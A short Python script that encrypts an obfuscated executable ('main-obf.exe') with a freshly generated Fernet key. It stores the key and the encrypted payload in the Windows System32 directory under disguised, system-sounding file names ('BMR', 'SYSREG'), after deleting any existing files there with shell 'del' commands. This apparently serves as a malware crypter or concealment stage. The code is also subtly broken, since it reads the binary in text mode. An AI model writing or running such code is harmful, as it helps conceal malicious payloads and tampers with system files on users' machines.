from cryptography.fernet import Fernet
import os
key = Fernet.generate_key()
os.system("del C:\Windows\System32\BMR")
keysave = open("C:\Windows\System32\BMR", "w")

keysave.write(str(key))
f= Fernet(key)
with open('main-obf.exe', 'r') as file:
    data = file.read().replace('\n', '')
encrypt=f.encrypt(bytes(data, encoding='utf8'))
os.system("del C:\Windows\System32\SYSREG")
exe = open("C:\Windows\System32\SYSREG", "w")
exe.write(str(encrypt))